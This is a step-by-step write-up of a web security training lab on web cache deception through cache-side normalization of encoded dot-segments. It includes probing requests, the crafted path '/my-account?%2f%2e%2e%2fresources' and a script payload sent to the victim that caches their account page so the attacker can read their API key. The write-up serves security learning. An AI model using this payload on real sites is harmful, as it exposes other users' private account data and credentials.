# Lab 4 — Exploiting cache server normalization for web cache deception

> [← Back to Web Cache Deception](../README.md)

---

## 🎯 Objective
The cache server (not the origin) normalizes encoded dot-segments. Exploit this to poison the cache with Carlos's account data.

---

## 🪜 Steps

### Step 1 — Login to wiener account
Credentials: `wiener:peter`

> 📸 Screenshot: `./screenshots/step1-login.png`

---

### Step 2 — Intercept and send to Repeater
Capture `GET /my-account` → send to **Repeater**.

> 📸 Screenshot: `./screenshots/step2-repeater.png`

---

### Step 3 — Test path handling
```
GET /my-account/abc   → 404
GET /my-accountabc    → 404
```

> 📸 Screenshot: `./screenshots/step3-404.png`

---

### Step 4 — Test delimiters via Intruder (Sniper)
Sniper attack with delimiters after `/my-account`. Uncheck URL-encode.

Result: `?` returns **200 OK**.

> 📸 Screenshot: `./screenshots/step4-delimiter.png`

---

### Step 5 — Test delimiter path
Try:
```
GET /my-account?abc.js
```
→ **200 OK** confirmed.

> 📸 Screenshot: `./screenshots/step5-delimiter-ok.png`

---

### Step 6 — Test normalization on origin
Try encoded dot-segment:
```
GET /aaa/..%2fmy-account
```
→ **404** — the origin does NOT normalize. The **cache** normalizes it instead.

> 📸 Screenshot: `./screenshots/step6-normalization-404.png`

---

### Step 7 — Identify cache static resource path
Test `/resources/` prefix:
```
GET /resources/test
```
- 1st request → `X-Cache: miss`
- 2nd request → `X-Cache: hit` ✅

> 📸 Screenshot: `./screenshots/step7-cache-miss.png`
> 📸 Screenshot: `./screenshots/step7-cache-hit.png`

---

### Step 8 — Add encoded dot-segment after /resources
Try:
```
GET /resources/..%2fmy-account
```
The cache normalizes this → checks if path starts with `/resources/` → **caches it**.
The origin receives the normalized path → returns `/my-account` content.

- 1st request → miss
- 2nd request → **hit** ✅

> 📸 Screenshot: `./screenshots/step8-miss.png`
> 📸 Screenshot: `./screenshots/step8-hit.png`

---

### Step 9 — Craft the exploit
The final exploit URL path used:
```
/my-account?%2f%2e%2e%2fresources
```

> 📸 Screenshot: `./screenshots/step9-craft.png`

---

### Step 10 — Deliver exploit to victim
On exploit server paste:

```html
<script>
  document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account?%2f%2e%2e%2fresources?wcd"
</script>
```

Store → Deliver to victim.

Then access:
```
GET /my-account?%2f%2e%2e%2fresources?wcd
```

> 📸 Screenshot: `./screenshots/step10-exploit.png`

---

### Step 11 — Get Carlos's API key
The cached response contains **Carlos's API key**. Submit it to solve the lab.

> 📸 Screenshot: `./screenshots/step11-api.png`
> 📸 Screenshot: `./screenshots/step11-solved.png`

---

## ✅ Result
Lab solved!

---

## 💡 Key Takeaway
Cache-side normalization is the mirror of origin-side normalization. When the cache resolves encoded dot-segments before matching cache rules, attackers can poison the cache with sensitive content hidden under static-looking paths.
